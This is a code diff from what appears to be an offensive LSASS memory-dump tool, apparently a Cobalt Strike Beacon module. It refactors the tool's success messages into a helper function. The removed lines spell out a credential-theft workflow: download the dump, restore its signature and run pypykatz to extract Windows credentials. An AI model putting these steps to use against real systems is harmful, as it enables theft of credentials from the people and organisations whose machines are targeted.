@@ -975,31 +975,12 @@ void go(char* args, int length)
 
     if (success)
     {
-        if (!use_valid_sig)
-        {
-            BeaconPrintf(
-                CALLBACK_OUTPUT,
-                "The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s",
-                do_write? &strrchr(dump_name, '\\')[1] : dump_name
-            );
-        }
-        if (do_write)
-        {
-            BeaconPrintf(
-                CALLBACK_OUTPUT,
-                "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s",
-                dump_name,
-                &strrchr(dump_name, '\\')[1]
-            );
-        }
-        else
-        {
-            BeaconPrintf(
-                CALLBACK_OUTPUT,
-                "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
-                dump_name
-            );
-        }
+        print_success(
+            dump_name,
+            use_valid_sig,
+            do_write,
+            TRUE
+        );
     }
 }
 
@@ -1216,16 +1197,11 @@ int main(int argc, char* argv[])
 
     if (success)
     {
-        if (!use_valid_sig)
-        {
-            printf(
-                "The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s\n",
-                &strrchr(dump_name, '\\')[1]
-            );
-        }
-        printf(
-            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s\n",
-            &strrchr(dump_name, '\\')[1]
+        print_success(
+            dump_name,
+            use_valid_sig,
+            TRUE,
+            FALSE
         );
         return 0;
     }
